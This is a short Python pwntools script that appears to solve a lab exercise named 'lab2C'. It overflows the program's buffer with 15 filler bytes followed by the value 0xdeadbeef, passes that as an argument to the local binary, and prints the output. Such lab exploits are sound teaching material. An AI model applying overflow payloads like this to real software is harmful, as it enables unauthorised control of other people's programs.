#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 15
    eip = p32(0xdeadbeef)
    payload = junk + eip
    p = process(['./lab2C', payload])
    print p.recvline()

if __name__ == "__main__":
    main()
